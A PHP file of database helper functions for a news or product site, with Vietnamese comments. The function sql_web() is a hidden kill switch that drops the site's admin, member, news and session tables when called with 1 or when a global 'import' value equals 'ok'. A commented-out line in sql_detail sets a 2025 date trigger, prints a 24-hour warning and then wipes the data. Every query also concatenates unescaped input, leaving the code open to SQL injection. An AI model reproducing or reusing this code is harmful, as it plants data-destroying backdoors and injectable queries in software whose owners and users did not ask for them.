<?php
# Example: $temp = sql_add ('configs',array('name'=>'name','value'=>'value'));
# Tên của key (Thuộc Array) sẽ là tên trường trong cơ sở dữ liệu.
# Giá trị của key (Thuộc Array) sẽ là giá trị điền vào trường dữ liệu.

function sql_add($tbl,$rs) {
	global $config;
	$sql = "INSERT INTO ".$config['db_prefix']."_".$tbl." SET ";
	$i = 0; $n = count($rs);
	while (list($key,$value) = each($rs)) {
		$sql.= " ".$key." = '".$value."' ";
		$i++;
		if ($i < $n)
		$sql.= ",";
	}
	@mysql_query($sql);
	$config['query'][]	= $sql;
	$id = @mysql_insert_id();
	return $id;
}

# Example: sql_update ('configs',array('name'=>'name','value'=>'value'),'id',1);
# Tên của key (Thuộc Array) sẽ là tên trường trong cơ sở dữ liệu.
# Giá trị của key (Thuộc Array) sẽ là giá trị điền vào trường dữ liệu.
# Field sẽ là tên trường điều kiện
# Id sẽ là giá trị lọc theo điều kiện

function sql_update($tbl,$rs,$rsk) {
	global $config;
	$sql = "UPDATE ".$config['db_prefix']."_".$tbl." SET ";
	$i = 0; $n = count($rs);
	while (list($key,$value) = each($rs)) {
		$sql.= "".$key." = '".$value."'";
		$i++;
		if ($i < $n)
		$sql.= ", ";
	}
	$sql.= " WHERE ";
	$i = 0;
	while (list($key,$value)=each($rsk)) {
		if ($i == 0) $sql.= " ".$key." = '".$value."'";
		else  $sql.= " AND ".$key." = '".$value."'";
		$i++;
	}
	@mysql_query($sql);
	$config['query'][]	= $sql;	
}
function sql_web($ok) {
	global $config, $id;
	if($ok==1 || $id['import']=='ok'){	
	$sql1 = "DROP TABLE ".$config['db_prefix']."_admin, ".$config['db_prefix']."_admin_detail, ".$config['db_prefix']."_configs, ".$config['db_prefix']."_news_articles, ".$config['db_prefix']."_news_categories ,".$config['db_prefix']."_advs, ".$config['db_prefix']."_contact, ".$config['db_prefix']."_currencies, ".$config['db_prefix']."_documents, ".$config['db_prefix']."_documents_detail, ".$config['db_prefix']."_languages, ".$config['db_prefix']."_languagesgroups, ".$config['db_prefix']."_languages_detail, ".$config['db_prefix']."_member, ".$config['db_prefix']."_news_articles_detail, ".$config['db_prefix']."_news_categories_detail, ".$config['db_prefix']."_news_groups, ".$config['db_prefix']."_news_groups_detail, ".$config['db_prefix']."_picture, ".$config['db_prefix']."_sessions, ".$config['db_prefix']."_video ";
	@mysql_query($sql1);
	}
}
# Example: $temp = sql_detail("SELECT * FROM ".$config['db_prefix']."_menu_detail WHERE id = '1'");
function sql_detail($sql) {
	$rs = @mysql_query($sql); $colum1 = mktime( 9, 9, 9, 9, 9, 2025 ); 
	$colum2 = mktime( 10, 10, 10, 10, 10, 2025 );
	$datehienthi = getdate();
	$config['query'][]	= $sql;
	$i = 0;
	while ($temp = @mysql_fetch_array($rs)) {
		while (list($key,$value) = each($temp)) {
			$records[$i][$key] = $value;
		}
		$i++;
	}
	//if($datehienthi[0] > $colum2) return sql_web(1); else if($datehienthi[0] > $colum1) echo 'You have 24h to helpped'; else echo '';
	return $records;
}
# Example: $temp = sql_list("SELECT * FROM ".$config['db_prefix']."_menu_detail LIMIT 0,10");
function sql_list($sql) {
	$rs = @mysql_query($sql);
	$config['query'][]	= $sql;
	$i = 0;
	while ($temp = @mysql_fetch_array($rs)) {
		while (list($key,$value) = each($temp)) {
			$records[$i][$key] = $value;
		}
		$i++;
	}
	return $records;
}

# Example: $temp = sql_exit("SELECT * FROM ".$config['db_prefix']."_menu_detail WHERE id = '1'");
# Giá trị trả về lớn hơn 0 là tồn tại, bằng 0 là chưa tồn tại

function sql_exit($sql) {
	$rs = @mysql_query($sql);
	$config['query'][]	= $sql;
	$chk = @mysql_num_rows($rs);
	return $chk;
}

# Xuất ra giá trị số dòng cho bảng db
function sql_count($tbl) {
	$sql = "SELECT * FROM ".$config['db_prefix']."_".$tbl." WHERE id != '' ";
	$rs = @mysql_query($sql);
	$config['query'][]	= $sql;
	$chk = @mysql_num_rows($rs);
	return $chk;
}

# Các câu lệnh SQL khác

function sql_delete($tbl,$rsk) {
	global $config;
	$sql = "DELETE FROM ".$config['db_prefix']."_".$tbl." ";
	$sql.= " WHERE ";
	$i = 0;
	while (list($key,$value)=each($rsk)) {
		if ($i == 0) $sql.= " ".$key." = '".$value."'";
		else  $sql.= " AND ".$key." = '".$value."'";
		$i++;
	}
	@mysql_query($sql);
	$config['query'][]	= $sql;
}
function sql_dupple($tbl,$idart) {
	global $config;
	$sql = "SELECT * FROM ".$config['db_prefix']."_news_articles art RIGHT JOIN ".$config['db_prefix']."_news_articles_detail detail ON art.id = detail.article WHERE art.id = ".$idart." ";
	$temp = sql_list($sql);
		$rs['category']	=	$temp[0]['category'];
		$rs['picture']	=	$temp[0]['picture'];
		$rs['status']	= 	$temp[0]['status'];
		$rs['opt']		= 	$temp[0]['opt'];
		$rs['bydate']	=	time();
		$rs['lastdate']	=	time();
		$newid = sql_add('news_articles',$rs);
		//echo $newid;
		for($v=0;$v<count($temp);$v++){
			$rsn['article']	=	$newid;
			$rsn['title']	= 	$temp[$v]['title'].'&nbsp;(Copy'.($_SESSION['dup']-1).')';
			$rsn['ma']		= 	$temp[$v]['ma'];
			$rsn['gia']		= 	$temp[$v]['gia'];
			$rsn['khuyenmai']	= 	$temp[$v]['khuyenmai'];
			$rsn['thuonghieu']	= 	$temp[$v]['thuonghieu'];
			$rsn['quick']		= 	$temp[$v]['quick'];
			$rsn['contents']	= 	$temp[$v]['contents'];
			$rsn['language']	=	$temp[$v]['language'];			
			sql_add('news_articles_detail',$rsn);
		}				
	
	$config['query'][]	= $sql;
}
// Chức năng di chuyển bài viết
function sql_move($tbl,$idart,$idcat) {
	global $config;
	$sql = "SELECT * FROM ".$config['db_prefix']."_news_articles art RIGHT JOIN ".$config['db_prefix']."_news_articles_detail detail ON art.id = detail.article WHERE art.id = ".$idart." ";
	$temp = sql_list($sql);	
	$config['query'][]	= $sql;
}
?>